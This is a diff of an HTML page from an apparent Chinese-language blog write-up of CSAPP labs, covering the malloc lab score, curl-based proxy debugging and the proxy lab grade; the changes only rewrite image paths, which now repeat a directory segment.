@@ -757,7 +757,7 @@ var _hmt = _hmt || [];
 <code>secs</code>表示执行当前用例所耗的总时间，<br>
 <code>Kops</code>即<code>Kop/s</code>，表示执行操作的速度，可以间接理解为吞吐量。</p>
 </blockquote>
-<img src="/2020/07/csapp-lab-writeup/malloc_lab_score.png" class="">  
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/malloc_lab_score.png" class>  
 <ul>
 <li>主要的失分点在于空间利用率。大部分测试样例的空间利用率都挺高，只有少部分的一些样例需要优化，例如realloc。<br>
 该代码仍然需要针对realloc的测试样例进行更深层次的优化。但编写这个lab的目的在于<strong>更深入的了解动态内存管理机制</strong>，笔者认为已经差不多达到了这个目的，所以没有继续进行优化。</li>
@@ -819,10 +819,10 @@ var _hmt = _hmt || [];
 </ul>
 <h3 id="4-测试">4) 测试</h3>
 <ul>
-<li>调试时，可以使用<code>curl -v &lt;webAddr&gt; --proxy &lt;proxyAddr&gt;</code>命令来调试，使用<code>-v</code>参数可以时curl输出发送的http内容与返回的http内容，便于调试。<img src="/2020/07/csapp-lab-writeup/proxy_curl.png" class="">
+<li>调试时，可以使用<code>curl -v &lt;webAddr&gt; --proxy &lt;proxyAddr&gt;</code>命令来调试，使用<code>-v</code>参数可以时curl输出发送的http内容与返回的http内容，便于调试。<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/proxy_curl.png" class>
 </li>
 <li>最终代码存放于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/8.%20Proxy%20Lab/proxy.c" target="_blank" rel="noopener">github</a><br>
-最后的评分如下<img src="/2020/07/csapp-lab-writeup/proxy_grade.png" class="">
+最后的评分如下<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/proxy_grade.png" class>
 </li>
 </ul>
  
